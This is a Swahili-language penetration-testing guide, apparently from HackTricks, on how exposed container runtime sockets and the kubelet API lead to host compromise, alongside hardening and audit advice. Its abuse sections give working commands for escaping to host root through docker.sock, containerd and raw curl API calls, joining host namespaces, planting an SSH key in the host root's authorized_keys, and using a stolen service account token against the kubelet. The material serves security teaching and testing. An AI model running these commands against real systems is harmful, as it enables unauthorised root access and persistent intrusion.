# API ya Runtime na Kufichuka kwa Daemon

{{#include ../../../banners/hacktricks-training.md}}

## Muhtasari

Matukio mengi halisi ya kuvamiwa kwa container hayaanzi kwa kutoroka namespace. Huanzia kwenye ufikiaji wa control plane ya runtime. Ikiwa workload inaweza kuwasiliana na `dockerd`, `containerd`, CRI-O, Podman, au kubelet kupitia Unix socket iliyowekwa ndani yake au TCP listener iliyo wazi, mshambuliaji anaweza kuomba container mpya yenye privileges zaidi, kuweka filesystem ya host, kujiunga na namespaces za host, au kupata taarifa nyeti za node. Katika hali hizo, runtime API ndiyo mpaka halisi wa usalama, na kuikompromiti ni karibu sawa na kuikompromiti host.

Ndiyo sababu kufichua runtime socket kunapaswa kurekodiwa kando na ulinzi wa kernel. Container yenye seccomp, capabilities, na MAC confinement za kawaida bado inaweza kuwa hatua moja tu ya API kutoka kwenye kuikompromiti host ikiwa `/var/run/docker.sock` au `/run/containerd/containerd.sock` imewekwa ndani yake. Kernel isolation ya container ya sasa inaweza kuwa inafanya kazi hasa kama ilivyokusudiwa huku management plane ya runtime ikiwa wazi kikamilifu.

## Miundo ya Ufikiaji wa Daemon

Docker Engine kwa kawaida huweka API yake yenye privileges kupitia Unix socket ya ndani kwenye `unix:///var/run/docker.sock`. Kihistoria, pia imekuwa ikifikiwa kwa mbali kupitia TCP listeners kama `tcp://0.0.0.0:2375` au listener inayolindwa na TLS kwenye `2376`. Kufichua daemon kwa mbali bila TLS imara na uthibitishaji wa mteja kwa ufanisi hugeuza Docker API kuwa kiolesura cha root cha mbali.

containerd, CRI-O, Podman, na kubelet hutoa sehemu za ufikiaji zenye athari kubwa kama hizo. Majina na workflows hutofautiana, lakini mantiki haibadiliki. Ikiwa kiolesura kinamruhusu mpigaji kuunda workloads, kuweka host paths, kupata credentials, au kubadilisha containers zinazoendeshwa, kiolesura hicho ni njia ya usimamizi yenye privileges na kinapaswa kuchukuliwa hivyo.

UI ya wavuti ya usimamizi wa container inaweza kufichua mpaka huo huo bila kumpa akaunti ya ndani ufikiaji wa moja kwa moja wa socket. Kwa mfano, [Portainer issue #493](https://github.com/portainer/portainer/issues/493) ilirekodi uwekaji upya wa nenosiri la msimamizi bila uthibitishaji katika build ya zamani ya 1.11.1. Ichukulie UI inayofikika ndani ya mfumo kama mwongozo wa kuchunguza tu: thibitisha build iliyosakinishwa na tabia ya uthibitishaji, udhibiti halisi wa msimamizi, na kama endpoint yake inayosimamiwa inaweza kuunda containers zenye host bind mount inayoweza kuandikwa. [Portainer documents](https://docs.portainer.io/admin/environments/add/docker/socket) zinaeleza kuwa usimamizi unaotegemea socket unahitaji ufikiaji wa Docker socket; endpoint ya rootless au yenye vikwazo hubadilisha athari kwa host. Usihitimishe kuwa kuna dosari ya uthibitishaji au ufikiaji wa root wa host kutokana na jina la process, port, au toleo pekee.

Njia za kawaida za ndani zinazostahili kuchunguzwa ni:

```text
/var/run/docker.sock
/run/docker.sock
/run/containerd/containerd.sock
/var/run/crio/crio.sock
/run/podman/podman.sock
/var/run/kubelet.sock
/run/buildkit/buildkitd.sock
/run/firecracker-containerd.sock
```

Mifumo ya zamani au maalum zaidi inaweza pia kufichua endpoints kama `dockershim.sock`, `frakti.sock`, au `rktlet.sock`. Hizi si za kawaida sana katika mazingira ya kisasa, lakini zikikutana nazo zinapaswa kushughulikiwa kwa tahadhari hiyo hiyo kwa sababu zinawakilisha sehemu za udhibiti wa runtime badala ya sockets za kawaida za programu.

## Ufikiaji Salama wa Mbali

Ikiwa daemon lazima ifikiwe nje ya socket ya ndani, muunganisho unapaswa kulindwa kwa TLS na ikiwezekana kutumia uthibitishaji wa pande zote, ili daemon ithibitishe mteja na mteja athibitishe daemon. Tabia ya zamani ya kufungua daemon ya Docker kupitia HTTP isiyosimbwa kwa urahisi ni mojawapo ya makosa hatari zaidi katika usimamizi wa container kwa sababu API ina uwezo wa kutosha kuunda containers zenye upendeleo moja kwa moja.

Muundo wa kihistoria wa usanidi wa Docker ulikuwa hivi:

```bash
DOCKER_OPTS="-H unix:///var/run/docker.sock -H tcp://192.168.56.101:2376"
sudo service docker restart
```

Kwenye hosts zinazotumia systemd, mawasiliano ya daemon yanaweza pia kuonekana kama `fd://`, ikimaanisha kuwa mchakato hurithi socket iliyofunguliwa mapema kutoka kwa systemd badala ya kuifunga moja kwa moja. Jambo muhimu si sintaksia yenyewe, bali athari zake kwa usalama. Daemon inaposikiliza nje ya socket ya ndani yenye ruhusa zilizodhibitiwa kwa ukali, usalama wa usafirishaji na uthibitishaji wa client huwa lazima badala ya kuwa hatua za hiari za kuimarisha usalama.

## Matumizi mabaya

Ikiwa runtime socket ipo, thibitisha ni ipi, kama client inayooana inapatikana, na kama ufikiaji wa HTTP au gRPC ghafi unawezekana:

```bash
find / -maxdepth 3 \( -name docker.sock -o -name containerd.sock -o -name crio.sock -o -name podman.sock -o -name kubelet.sock \) 2>/dev/null
ss -xl | grep -E 'docker|containerd|crio|podman|kubelet' 2>/dev/null
docker -H unix:///var/run/docker.sock version 2>/dev/null
podman --url unix:///run/podman/podman.sock info 2>/dev/null
nerdctl --address /run/containerd/containerd.sock --namespace k8s.io ps 2>/dev/null
ctr --address /run/containerd/containerd.sock images ls 2>/dev/null
crictl --runtime-endpoint unix:///run/containerd/containerd.sock ps 2>/dev/null
crictl --runtime-endpoint unix:///var/run/crio/crio.sock ps 2>/dev/null
buildctl --addr unix:///run/buildkit/buildkitd.sock debug workers 2>/dev/null
```

Amri hizi ni muhimu kwa sababu hutofautisha kati ya njia isiyofanya kazi, socket iliyomountiwa lakini isiyoweza kufikiwa, na API hai yenye ruhusa za juu. Ikiwa client itafaulu, swali linalofuata ni kama API inaweza kuzindua container mpya yenye bind mount ya host au kushiriki namespace ya host.

### Wakati Hakuna Client Iliyosakinishwa

Kutokuwepo kwa `docker`, `podman`, au CLI nyingine rahisi kutumia hakumaanishi kwamba socket iko salama. Docker Engine hutumia HTTP kupitia Unix socket yake, na Podman hutoa API inayooana na Docker pamoja na API ya asili ya Libpod kupitia `podman system service`. Hiyo inamaanisha mazingira madogo yenye `curl` pekee yanaweza kutosha kuendesha daemon:

```bash
curl --unix-socket /var/run/docker.sock http://localhost/_ping
curl --unix-socket /var/run/docker.sock http://localhost/v1.54/images/json
curl --unix-socket /var/run/docker.sock \
  -H 'Content-Type: application/json' \
  -d '{"Image":"ubuntu:24.04","Cmd":["id"],"HostConfig":{"Binds":["/:/host"]}}' \
  -X POST http://localhost/v1.54/containers/create

curl --unix-socket /run/podman/podman.sock http://d/_ping
curl --unix-socket /run/podman/podman.sock http://d/v1.40.0/images/json
```

Kwa utekelezaji wa msimbo wa PHP uliozuiwa na `open_basedir`, [miunganisho ya Unix socket bado ni njia tofauti](../../../network-services-pentesting/pentesting-web/php-tricks-esp/php-useful-functions-disable_functions-open_basedir-bypass/#unix-sockets-outside-open_basedir) ikiwa mchakato wa PHP una ruhusa ya OS ya kuunganisha.

Hili ni muhimu wakati wa post-exploitation kwa sababu wakati mwingine watetezi huondoa client binaries za kawaida lakini huacha management socket ikiwa imewekwa. Kwenye hosts za Podman, kumbuka kuwa path yenye thamani kubwa hutofautiana kati ya deployments za rootful na rootless: `unix:///run/podman/podman.sock` kwa service instances za rootful na `unix://$XDG_RUNTIME_DIR/podman/podman.sock` kwa rootless.

### Mfano Kamili: Docker Socket Hadi Root ya Host

Ikiwa `docker.sock` inaweza kufikiwa, escape ya kawaida ni kuanzisha container mpya inayoweka host root filesystem kisha kutumia `chroot` kuingia ndani yake:

```bash
docker -H unix:///var/run/docker.sock images
docker -H unix:///var/run/docker.sock run --rm -it -v /:/host ubuntu:24.04 chroot /host /bin/bash
```

Hii hutoa uwezo wa kutekeleza amri moja kwa moja kama root wa host kupitia Docker daemon. Athari hazikomei kwenye kusoma faili. Akiwa ndani ya container mpya, mshambuliaji anaweza kubadilisha faili za host, kukusanya credentials, kupandikiza persistence, au kuanzisha workloads nyingine zenye privileges.

### Mfano Kamili: Docker Socket Hadi Host Namespaces

Ikiwa mshambuliaji anapendelea kuingia kwenye namespaces badala ya kupata ufikiaji wa mfumo wa faili pekee:

```bash
docker -H unix:///var/run/docker.sock run --rm -it --pid=host --privileged ubuntu:24.04 bash
nsenter --target 1 --mount --uts --ipc --net --pid -- bash
```

Njia hii hufikia host kwa kuomba runtime iunde container mpya yenye ufikiaji wa namespace za host uliobainishwa wazi, badala ya kutumia vibaya container ya sasa.

### Mfumo wa Persistence kupitia Docker Socket

Udhibiti wa runtime unaweza pia kutumiwa kudumisha ufikiaji badala ya kutumia shell mara moja tu. Mfumo wa jumla ni kuunda helper container yenye host mount, kuandika nyenzo za ufikiaji zilizoidhinishwa au startup hook kwenye filesystem ya host iliyomountiwa, kisha kuthibitisha kuwa host inaitumia.

Mfano wa muundo:

```bash
docker -H unix:///var/run/docker.sock run -d --name helper -v /:/host ubuntu:24.04 sleep infinity
docker -H unix:///var/run/docker.sock exec helper sh -c 'mkdir -p /host/root/.ssh && chmod 700 /host/root/.ssh'
docker -H unix:///var/run/docker.sock cp ./id_ed25519.pub helper:/tmp/key.pub
docker -H unix:///var/run/docker.sock exec helper sh -c 'cat /tmp/key.pub >>/host/root/.ssh/authorized_keys'
```

Wazo hilo hilo linaweza kulenga systemd units, vipande vya cron, faili za kuanzisha programu, au funguo za SSH, kutegemea operator anachotaka kuthibitisha. Jambo muhimu ni kwamba mabadiliko endelevu hufanywa kupitia mamlaka ya daemon ya runtime juu ya filesystem ya host, si kupitia ruhusa za ziada ndani ya container ya awali.

### Raw Docker API Helper Pivot

Docker CLI inapokosekana, mtiririko huo huo wa kutumia helper yenye host mount unaweza kuendeshwa kupitia HTTP kwa kutumia Unix socket. Mtiririko wa jumla ni: thibitisha API, unda container ya helper yenye host bind mount, iwashe, unda exec instance, kisha uanzishe exec hiyo.

```bash
curl --unix-socket /var/run/docker.sock http://localhost/_ping
curl --unix-socket /var/run/docker.sock \
  -H 'Content-Type: application/json' \
  -d '{"Image":"ubuntu:24.04","Cmd":["sleep","3600"],"HostConfig":{"Binds":["/:/host:rw"]}}' \
  -X POST http://localhost/v1.54/containers/create?name=helper
curl --unix-socket /var/run/docker.sock -X POST http://localhost/v1.54/containers/helper/start
curl --unix-socket /var/run/docker.sock \
  -H 'Content-Type: application/json' \
  -d '{"AttachStdout":true,"AttachStderr":true,"Cmd":["chroot","/host","id"]}' \
  -X POST http://localhost/v1.54/containers/helper/exec
```

Ombi la mwisho la `/exec/<id>/start` hutegemea exec ID iliyorejeshwa, lakini hoja ya usalama haitegemei jinsi JSON inavyoshughulikiwa: ufikiaji wa moja kwa moja wa API ya daemon ya Docker inayoendeshwa kama root unatosha kuomba workload saidizi yenye nguvu zaidi.

### Mfano Kamili: Socket ya containerd

Socket ya `containerd` iliyowekwa kwa kawaida huwa hatari vivyo hivyo:<sup>[[1]](#references)</sup>

```bash
ctr --address /run/containerd/containerd.sock images pull docker.io/library/busybox:latest
ctr --address /run/containerd/containerd.sock run --tty --privileged --mount type=bind,src=/,dst=/host,options=rbind:rw docker.io/library/busybox:latest host /bin/sh
chroot /host /bin/sh
```

Ikiwa kuna client inayofanana zaidi na Docker, `nerdctl` inaweza kuwa rahisi zaidi kutumia kuliko `ctr` kwa sababu ina flags zinazojulikana kama `--privileged`, `--pid=host`, na `-v`:

```bash
nerdctl --address /run/containerd/containerd.sock --namespace k8s.io run --rm -it \
  --privileged --pid=host -v /:/host docker.io/library/alpine:latest sh
chroot /host /bin/sh
```

Athari bado ni kudhibiti host. Hata kama zana mahususi za Docker hazipo, runtime API nyingine bado inaweza kutoa uwezo uleule wa usimamizi. Kwenye nodi za Kubernetes, `crictl` pia inaweza kutosha kwa reconnaissance na mwingiliano na kontena kwa sababu huwasiliana moja kwa moja na endpoint ya CRI.

### BuildKit Socket

Ni rahisi kupuuzia `buildkitd` kwa sababu mara nyingi watu hudhani ni "backend ya build tu", lakini daemon bado ni control plane yenye mamlaka makubwa. `buildkitd.sock` inayoweza kufikiwa inaweza kumruhusu mshambulizi kutekeleza hatua zozote za build, kukagua uwezo wa worker, kutumia contexts za ndani kutoka kwenye mazingira yaliyoathiriwa, na kuomba entitlements hatari kama `network.host` au `security.insecure` ikiwa daemon imesanidiwa kuziruhusu.

Muingiliano wa awali unaofaa ni:

```bash
buildctl --addr unix:///run/buildkit/buildkitd.sock debug workers
buildctl --addr unix:///run/buildkit/buildkitd.sock du
```

Ikiwa daemon inakubali maombi ya build, jaribu kuona kama entitlements zisizo salama zinapatikana:

```bash
buildctl --addr unix:///run/buildkit/buildkitd.sock build \
  --frontend dockerfile.v0 \
  --local context=. \
  --local dockerfile=. \
  --allow network.host \
  --allow security.insecure \
  --output type=local,dest=/tmp/buildkit-out
```

Athari halisi hutegemea usanidi wa daemon, lakini huduma ya BuildKit ya rootful yenye entitlements zisizo na vizuizi si urahisishaji usio na madhara kwa wasanidi. Ichukulie kama sehemu nyingine ya kiutawala yenye thamani kubwa, hasa kwenye CI runners na nodi za build zinazotumiwa kwa pamoja.

### Kubelet API Kupitia TCP

Kubelet si container runtime, lakini bado ni sehemu ya usimamizi wa node na mara nyingi hujadiliwa ndani ya mpaka huohuo wa uaminifu. Ikiwa port salama ya kubelet `10250` inaweza kufikiwa kutoka kwenye workload, au ikiwa credentials za node, kubeconfigs au haki za proxy zimefichuliwa, mshambulizi anaweza kuorodhesha Pods, kupata logs au kutekeleza amri kwenye containers za node bila kupitia njia ya admission ya Kubernetes API server.

Anza kwa ugunduzi rahisi:

```bash
curl -sk https://127.0.0.1:10250/pods
curl -sk https://127.0.0.1:10250/runningpods/
TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token 2>/dev/null)
curl -sk -H "Authorization: Bearer $TOKEN" https://127.0.0.1:10250/pods
```

Ikiwa njia ya kubelet au API-server proxy inaidhinisha `exec`, client inayotumia WebSocket inaweza kuitumia kutekeleza code kwenye containers nyingine kwenye node. Hii pia ndiyo sababu ruhusa ya `get` pekee kwenye `nodes/proxy` ni hatari zaidi kuliko inavyoweza kuonekana: request bado inaweza kufikia endpoints za kubelet zinazotekeleza commands, na mwingiliano huo wa moja kwa moja na kubelet hauonekani kwenye logs za kawaida za Kubernetes audit.<sup>[[2]](#references)</sup>

## Ukaguzi

Lengo la ukaguzi huu ni kubaini kama container inaweza kufikia management plane yoyote ambayo ilipaswa kubaki nje ya mpaka wa uaminifu.

```bash
mount | grep -E '/var/run|/run|docker.sock|containerd.sock|crio.sock|podman.sock|kubelet.sock'
ss -lntp 2>/dev/null | grep -E ':2375|:2376'
env | grep -E 'DOCKER_HOST|CONTAINERD_ADDRESS|CRI_CONFIG_FILE|BUILDKIT_HOST|XDG_RUNTIME_DIR'
find /run /var/run -maxdepth 3 \( -name 'buildkitd.sock' -o -name 'podman.sock' \) 2>/dev/null
```

Kinachovutia hapa:

- Socket ya runtime iliyowekwa kama mount kwa kawaida ni njia ya moja kwa moja ya kupata mamlaka ya usimamizi, badala ya kufichua taarifa tu.
- Listener ya TCP kwenye `2375` bila TLS inapaswa kuchukuliwa kuwa hali inayowezesha mfumo kuathiriwa kwa mbali.
- Vigezo vya mazingira kama `DOCKER_HOST` mara nyingi hufichua kuwa workload iliundwa kimakusudi ili kuwasiliana na runtime ya host.

## Chaguo-msingi za Runtime

| Runtime / jukwaa | Hali ya chaguo-msingi | Tabia ya chaguo-msingi | Kudhoofisha kwa mikono kunakotokea mara nyingi |
| --- | --- | --- | --- |
| Docker Engine | Socket ya Unix ya ndani kwa chaguo-msingi | `dockerd` husikiliza kwenye socket ya ndani na daemon kwa kawaida hutumia root | kuweka `/var/run/docker.sock` kama mount, kufichua `tcp://...:2375`, TLS dhaifu au kutokuwepo kabisa kwenye `2376` |
| Podman | CLI isiyotegemea daemon kwa chaguo-msingi | Hakuna daemon ya muda mrefu yenye mamlaka ya juu inayohitajika kwa matumizi ya kawaida ya ndani; socket za API bado zinaweza kufichuliwa `podman system service` ikiwashwa | kufichua `podman.sock`, kuendesha service kwa upana, kutumia API ya rootful |
| containerd | Socket ya ndani yenye mamlaka ya juu | API ya usimamizi hufichuliwa kupitia socket ya ndani na kwa kawaida hutumiwa na zana za kiwango cha juu | kuweka `containerd.sock` kama mount, ufikiaji mpana wa `ctr` au `nerdctl`, kufichua namespaces zenye mamlaka ya juu |
| CRI-O | Socket ya ndani yenye mamlaka ya juu | Endpoint ya CRI imekusudiwa kutumiwa na vipengele vinavyoaminika vilivyo kwenye node hiyo | kuweka `crio.sock` kama mount, kufichua endpoint ya CRI kwa workloads zisizoaminika |
| Kubernetes kubelet | API ya usimamizi ya ndani ya node | Kubelet haipaswi kufikiwa kwa upana kutoka kwa Pods; kutegemea authn/authz, ufikiaji unaweza kufichua hali ya pod, credentials na vipengele vya kutekeleza | kuweka socket au certs za kubelet kama mount, auth dhaifu ya kubelet, host networking pamoja na endpoint ya kubelet inayoweza kufikiwa |



## References

- [1] [unyonyaji wa socket ya containerd, sehemu ya 1](https://thegreycorner.com/2025/02/12/containerd-socket-exploitation-part-1.html)
- [2] [Hatari za kukwepa Kubernetes API Server](https://kubernetes.io/docs/concepts/security/api-server-bypass-risks/)
{{#include ../../../banners/hacktricks-training.md}}
